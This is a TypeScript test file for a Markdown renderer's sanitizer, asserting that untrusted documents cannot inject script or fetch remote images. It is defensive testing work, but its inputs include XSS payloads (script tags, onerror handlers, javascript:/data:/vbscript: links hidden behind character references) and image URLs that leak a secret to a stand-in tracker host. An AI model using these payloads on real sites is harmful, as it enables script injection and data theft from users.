import assert from 'node:assert/strict'
import { test } from 'node:test'

import { escapeHtml, renderMarkdown } from '../src/server/markdown.ts'
import { decodeCharacterReferences } from '../src/server/sanitize.ts'

/**
 * Unit tests for the document renderer.
 *
 * The property that matters most is the first one: a document is **untrusted text** — it comes from a model, a
 * repository, or a person — and the only tags in the output may be the ones the renderer writes. A renderer
 * that gets that wrong fails silently and dangerously, so it is asserted rather than assumed.
 */

test('a document cannot inject markup', () => {
  /**
   * The sanitizer is an allow-list over the parser's output, so a `script` element is **dropped with its content**
   * — showing `alert(1)` as text is not a favour to a reader — while a tag that is allowed keeps only the
   * attributes allowed on it.
   */
  const html = renderMarkdown('Hello <script>alert(1)</script> and <img src=/x.png onerror=alert(1)>')
  assert.ok(!html.includes('<script'), 'no script tag survives')
  assert.ok(!html.includes('alert(1)'), 'and its content is dropped rather than shown')
  assert.ok(!html.includes('onerror'), 'an event handler cannot survive on an allowed tag')
  /** An answer's image is a local file, served by the file route (live issue developer-two-7). */
  assert.match(html, /<img src="\/api\/raw\?path=%2Fx\.png">/, 'while the tag itself keeps the attribute that is allowed')
})

test('a link that would run script is refused, and the label survives', () => {
  /**
   * The first version of this test asserted only that the URL stayed inside its attribute, and rationalised
   * `javascript:` as "the browser decides". That is not a guarantee: the browser follows what it is given, and
   * a document is untrusted text. The renderer now checks the scheme, so the link becomes text and the reader
   * still sees the words.
   */
  const html = renderMarkdown('[click](javascript:alert(1))')
  assert.ok(!html.includes('<a '), 'no anchor is produced at all')
  assert.match(html, /click \(link refused\)/, 'and the label is shown with the reason')
  assert.ok(!html.includes('\" onclick'), 'nothing can add an attribute of its own')

  /** A `data:` URL is the same hazard in a different spelling. */
  assert.ok(!renderMarkdown('[x](data:text/html,<script>alert(1)</script>)').includes('<a '), 'a data URL is refused too')

  for (const url of ['https://example.com/a', 'http://example.com', 'mailto:someone@example.com', 'docs/INDEX.md', '#a-heading']) {
    assert.ok(renderMarkdown(`[label](${url})`).includes('<a href='), `${url} is followed`)
  }
})

test('headings, paragraphs, and rules', () => {
  const html = renderMarkdown('# Title\n\nA paragraph.\n\n---\n\n## Second\n')
  assert.match(html, /<h1>Title<\/h1>/, 'a level-one heading')
  assert.match(html, /<p>A paragraph\.<\/p>/, 'a paragraph')
  assert.match(html, /<hr>/, 'a rule')
  assert.match(html, /<h2>Second<\/h2>/, 'a level-two heading')
})

test('emphasis, code spans, and strikethrough', () => {
  const html = renderMarkdown('Use **bold**, *italic*, `code`, and ~~gone~~.')
  assert.match(html, /<strong>bold<\/strong>/)
  assert.match(html, /<em>italic<\/em>/)
  assert.match(html, /<code>code<\/code>/)
  assert.match(html, /<del>gone<\/del>/)
})

test('emphasis inside a code span stays literal, because a document about code depends on it', () => {
  const html = renderMarkdown('The literal `a ** b` is multiplication.')
  assert.match(html, /<code>a \*\* b<\/code>/, 'the asterisks survive as text')
  assert.ok(!html.includes('<strong>'), 'and nothing is bolded inside it')
})

test('a fenced block keeps its language and its text exactly', () => {
  /**
   * Asserted on the block's **text**, not its markup: the highlighter tokenises the code into spans, so the source
   * is no longer one run of characters in the HTML. What has to hold is that stripping the tags gives back exactly
   * what the fence held, and that the escaping is not applied twice.
   */
  const html = renderMarkdown('```ts\nconst x: number = 1 < 2 ? a : b\n```')
  assert.match(html, /<pre><code class="language-ts">/, 'the language is carried')
  assert.ok(!html.includes('&amp;lt;'), 'and the escaping is not applied twice')
  const text = html.replace(/<[^>]+>/g, '').replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&amp;/g, '&')
  assert.equal(text.trim(), 'const x: number = 1 < 2 ? a : b', 'the code reads exactly as it was written')
})

test('an unterminated fence still renders its content rather than swallowing it', () => {
  const html = renderMarkdown('```\nno closing fence\n')
  assert.match(html, /no closing fence/, 'the lines are shown')
  assert.match(html, /<pre><code>/, 'inside a code block')
})

test('consecutive items join one list, and a switch of marker starts another', () => {
  const html = renderMarkdown('- one\n- two\n\n1. first\n2. second\n')
  assert.equal((html.match(/<ul>/g) ?? []).length, 1, 'one unordered list')
  assert.equal((html.match(/<ol>/g) ?? []).length, 1, 'and one ordered list')
  assert.equal((html.match(/<li>/g) ?? []).length, 4, 'holding every item')
})

test('a quote is its own block', () => {
  /**
   * The block's lines are kept as the parser keeps them. The written renderer joined them into one line; the
   * library wraps them in a paragraph inside the blockquote, which is what CommonMark says and what a reader
   * expects from a quoted paragraph.
   */
  const html = renderMarkdown('> quoted words\n> on two lines\n')
  assert.match(html, /<blockquote>/, 'a quote is a blockquote')
  assert.match(html, /quoted words/, 'holding its text')
  assert.match(html, /on two lines/, 'and every line of it')
})

test('an unrecognised construct is shown rather than dropped', () => {
  /**
   * A renderer that swallows what it does not understand loses the reader's text without saying so, which is
   * worse than showing it plainly.
   *
   * A table is no longer one of these: it is understood, and the test that used to assert it became text is
   * now the table test below.
   */
  const html = renderMarkdown('::: callout\nodd\n:::')
  assert.match(html, /::: callout/, 'an unknown directive is still visible')
})

test('a table renders as a table, with its cells and its alignment', () => {
  /**
   * The owner's report: a document's tables were rendered as text. A table is the one construct where "shown as
   * text" is not a readable fallback — the columns are the information — so it is the one the renderer has to
   * understand rather than pass through.
   */
  const html = renderMarkdown('| Part | Claims | State |\n| --- | ---: | :---: |\n| 1 | 10 | holds |\n| 2 | 6 | holds |\n')
  assert.equal((html.match(/<table>/g) ?? []).length, 1, 'one table')
  /** `/<th/` would also count `<thead>` — measured, and it reported four header cells for three. */
  assert.equal((html.match(/<th[\s>]/g) ?? []).length, 3, 'three header cells')
  assert.equal((html.match(/<td[\s>]/g) ?? []).length, 6, 'six body cells')
  assert.match(html, /<th>Part<\/th>/, 'the header text is a header cell')
  /** The alignment attribute is the parser's choice, and it is the standard one: `<th align="…">`. */
  assert.match(html, /<th align="right">Claims<\/th>/, 'a right-aligned column says so')
  assert.match(html, /<th align="center">State<\/th>/, 'and a centered one')
  assert.match(html, /<td align="right">10<\/td>/, 'including in the body')
  assert.ok(!html.includes('|'), 'no pipe is left as text')
})

test('a table row does not need its outer pipes, and an escaped pipe stays in its cell', () => {
  const html = renderMarkdown('a | b\n--- | ---\n1 | 2\n')
  assert.equal((html.match(/<th[\s>]/g) ?? []).length, 2, 'a row without outer pipes is still a row')
  /** Asserted on the string, because in a regex `a \| b` is alternation rather than an escaped pipe. */
  assert.ok(
    renderMarkdown('| x |\n| --- |\n| a \\| b |').includes('<td>a | b</td>'),
    'an escaped pipe stays inside its cell',
  )
})

test('emphasis and code work inside a cell, and the cell is still escaped', () => {
  const html = renderMarkdown('| what | how |\n| --- | --- |\n| **bold** | `<x>` |\n')
  assert.match(html, /<td><strong>bold<\/strong><\/td>/, 'inline spans render in a cell')
  assert.match(html, /<td><code>&lt;x&gt;<\/code><\/td>/, 'and code is escaped inside its cell')
})

test('a table is not read where there is no delimiter row', () => {
  /** The delimiter row is what makes the line above it a header; without one this is a paragraph with pipes. */
  const html = renderMarkdown('| a | b |\n| c | d |\n')
  assert.ok(!html.includes('<table>'), 'no table is invented')
  assert.match(html, /\| a \| b \|/, 'and the text is shown as it was written')
})

test('a bolded tag does not become a tag', () => {
  /**
   * The written renderer escaped the source first, so this came out as `<strong>&lt;b&gt;…`. The library parses
   * the text and the sanitizer then drops the element, because `b` is not an element a document view shows —
   * which is the same guarantee by a different route: no tag the document wrote survives inside the emphasis.
   */
  const html = renderMarkdown('**<b>not bold</b>**')
  assert.match(html, /<strong>not bold<\/strong>/, 'the emphasis survives with its text')
  assert.ok(!html.includes('<b>'), 'and the element the document wrote does not')
})

test('escaping covers every character that can break out', () => {
  assert.equal(escapeHtml('&<>"\''), '&amp;&lt;&gt;&quot;&#39;')
})

test('rendering is repeatable and empty input is empty output', () => {
  const source = '# A\n\ntext with `code`\n'
  assert.equal(renderMarkdown(source), renderMarkdown(source), 'no state to drift')
  assert.equal(renderMarkdown(''), '', 'and nothing in gives nothing out')
})

test('a document\'s frontmatter is shown as metadata, not read as prose', () => {
  /**
   * Every document in this repository opens with a YAML block. Measured: it rendered as the first paragraph —
   * `title: heddle version: 0.3.0 description: …` — which reads as a sentence and is not one.
   */
  const html = renderMarkdown('---\ntitle: A Document\nversion: 1.0.0\n---\n\n# Heading\n\nBody.\n')
  assert.match(html, /<section class="frontmatter">/, 'the block is lifted into its own section')
  assert.match(html, /title: A Document/, 'with its content intact')
  assert.doesNotMatch(html, /<p>title:/, 'and it is not rendered as a paragraph')
  assert.match(html, /<h1>Heading<\/h1>/, 'while the body renders normally')

  /** A document without frontmatter is unchanged by the rule. */
  assert.doesNotMatch(renderMarkdown('# Plain\n'), /frontmatter/)
  /** And a `---` that is a thematic break rather than an opening fence is still a rule. */
  assert.match(renderMarkdown('text\n\n---\n\nmore'), /<hr>/, 'a rule later in the document is still a rule')
})

test('a name that begins and ends with an underscore keeps its underscores', () => {
  /**
   * The defect this pins was measured against this repository, where it was everywhere: `# _tools_` rendered as
   * `<em>tools</em>`, so `_tools_`, `_verifiers_`, `_context_` and `_projects_` — the folder names the project is
   * made of — **lost their underscores** in every document that named one. `snake_case` inside a word survived,
   * which is why it took a document with a folder name in it to see.
   */
  assert.match(renderMarkdown('# _tools_'), /<h1>_tools_<\/h1>/, 'a heading keeps the name')
  assert.match(renderMarkdown('See _verifiers_ for that.'), /_verifiers_/, 'and so does a sentence')
  assert.ok(!renderMarkdown('_tools_').includes('<em>'), 'nothing is emphasised')
})

test('underscore emphasis is given up for names, and asterisks still emphasise', () => {
  /** The trade is stated rather than hidden: `_name_` is a name here, so italics are written with asterisks. */
  assert.match(renderMarkdown('*italic* and **bold**'), /<em>italic<\/em>.*<strong>bold<\/strong>/, 'asterisks work')
  assert.match(renderMarkdown('a_b_c'), /a_b_c/, 'and an underscore inside a word was never at risk')
})

test('an escape for a name never becomes visible inside code', () => {
  /**
   * A backslash inside code **is** visible — measured, a fence holding `_a_b_` rendered as `\_a_b_`. An escape that
   * changes the text of code is worse than the emphasis it prevents, so fences and code spans are skipped.
   */
  const fenced = renderMarkdown('```python\nx = _a_b_\n```')
  assert.ok(!fenced.includes('\\_'), 'no backslash reaches the fence')
  assert.match(fenced, /_a_b_/, 'and the code is exact')
  const span = renderMarkdown('the `_tools_` folder')
  assert.ok(!span.includes('\\_'), 'nor a code span')
  assert.match(span, /<code>_tools_<\/code>/, 'which keeps its underscores without help')
})

test('a code span inside link text is code, not literal backticks', () => {
  /**
   * Measured in the browser: "See [`_verifiers_/`](…)" rendered as an anchor whose text was a backtick, a name, and
   * another backtick — and this repository's index tables are full of exactly that shape, so every table of parts
   * showed stray backticks. The renderer hook was passing the label's **raw text** through instead of the tokens the
   * parser had already produced.
   */
  /**
   * Asserted on the **label**, which is what this test is about: a link to a file carries the address the panel
   * follows, so the assertion is the markup inside the anchor rather than the address itself — that is judged where
   * the resolver lives.
   */
  assert.match(
    renderMarkdown('See [`_verifiers_/`](_verifiers_/INDEX.md) here.'),
    /<a [^>]*><code>_verifiers_\/<\/code><\/a>/,
    'the label is a code element, and the name keeps its underscores',
  )
  assert.match(renderMarkdown('[**bold** label](a.md)'), /<a [^>]*><strong>bold<\/strong> label<\/a>/, 'emphasis in a label too')
  assert.ok(!renderMarkdown('[`x`](a.md)').includes('`x`'), 'and no backtick survives as text')
})

test('a table cell whose link label holds a code span stays one cell', () => {
  /** The shape that made it visible: an index table, where a stray backtick wraps the cell onto a second line. */
  const html = renderMarkdown('| a | b |\n| --- | --- |\n| [`_tools_/`](_tools_/INDEX.md) | a claim |\n')
  assert.equal((html.match(/<td[\\s>]/g) ?? []).length, 2, 'two cells, not three')
  assert.match(html, /<td><a [^>]*><code>_tools_\/<\/code><\/a><\/td>/, 'and the label is code inside the link')
})

test('refusing a link keeps its rendered label', () => {
  /** The refusal must not throw away what the label meant: bold and code in it are still rendered. */
  const html = renderMarkdown('[**danger**](javascript:alert(1))')
  assert.ok(!html.includes('<a '), 'no anchor is produced')
  assert.match(html, /<strong>danger<\/strong> \(link refused\)/, 'and the label is rendered, with the reason')
})

/** Every `href` and `src` the page would follow, read as the browser reads it: references decoded, tab and newline dropped. */
function followed(html: string): string[] {
  return [...html.matchAll(/\s(?:href|src)="([^"]*)"/g)].map((match) => decodeCharacterReferences(match[1] ?? '').replace(/[\t\n\r]/g, '').trim())
}

test('a link whose scheme is hidden behind character references is refused, as the browser would decode it', () => {
  /**
   * Live issue developer-two-6 (P0, 2026-10-29): both builds judged a raw HTML `href` as written, so each of these
   * reached the page unchanged and decoded there into a script or data URL. A click ran script in heddle's origin.
   */
  const hidden = [
    '<a href="&#x6A;avascript:alert(1)">a</a>',
    '<a href="&#106;avascript:alert(1)">b</a>',
    '<a href="&#0000106;avascript:alert(1)">c</a>',
    '<a href="&#x6Aavascript:alert(1)">no semicolon</a>',
    '<a href="java&#x09;script:alert(1)">d</a>',
    '<a href="java&Tab;script:alert(1)">e</a>',
    '<a href="javascript&colon;alert(1)">f</a>',
    '<a href="&#x64;ata:text/html,x">g</a>',
    '<a href="&#32;javascript:alert(1)">leading space</a>',
    '<a href="vb&#x73;cript:x">h</a>',
  ]
  for (const source of hidden) {
    const html = renderMarkdown(source)
    for (const url of followed(html)) {
      assert.doesNotMatch(url, /^(?:javascript|data|vbscript):/i, `${source} must not reach the page as ${url}`)
    }
  }
  /** What a document legitimately links to is kept, references and all. */
  assert.deepEqual(followed(renderMarkdown('<a href="https://example.com/?a=1&amp;b=2">x</a>')), ['https://example.com/?a=1&b=2'])
  assert.match(renderMarkdown('<a href="https://example.com/?a=1&amp;b=2">x</a>'), /href="https:\/\/example\.com\/\?a=1&amp;b=2"/)
  assert.deepEqual(followed(renderMarkdown('<a href="mailto:a&#64;b.example">x</a>')), ['mailto:a@b.example'])
})

test('an answer shows only local images, so it cannot make the page fetch from another host', () => {
  /**
   * Live issue developer-two-7 (P0, 2026-10-29): an answer's remote image was fetched the moment the answer was drawn,
   * a no-click channel out. DSH's `localPathMediaUrl` resolves an image to its file API or not at all.
   */
  const remote = [
    '![x](https://tracker.example/p.png?d=SECRET)',
    '<img src="https://tracker.example/p.png?d=SECRET">',
    '![x](//tracker.example/p.png)',
    '<img src="//tracker.example/p.png">',
    '<img src="&#x2F;&#x2F;tracker.example/p.png">',
    '<img src="http&#x3A;//tracker.example/p.png">',
  ]
  for (const source of remote) {
    const html = renderMarkdown(source)
    assert.ok(!followed(html).some((url) => /^(?:[a-z][a-z0-9+.-]*:)?\/\//i.test(url)), `${source} fetches nothing remote: ${html}`)
  }
  assert.match(renderMarkdown('![x](https://tracker.example/p.png)'), /<p>x<\/p>/, 'a refused image is its alt text')
  assert.match(renderMarkdown('![x](/api/sessions)'), /src="\/api\/raw\?path=%2Fapi%2Fsessions"/, 'an absolute path is a file, not an API of the answer\'s choosing')
  assert.match(renderMarkdown('![plot](/w/plot.png)'), /src="\/api\/raw\?path=%2Fw%2Fplot\.png"/, 'a local image still shows')
  assert.equal(followed(renderMarkdown('![p](plot.png)')).length, 0, 'a relative image with no folder to resolve against is not fetched')
  /** A document's preview keeps its author's remote image as written: a badge in a README. */
  assert.match(renderMarkdown('![b](https://img.shields.io/x.svg)', { base: '/w', remoteImages: true }), /src="https:\/\/img\.shields\.io\/x\.svg"/)
})
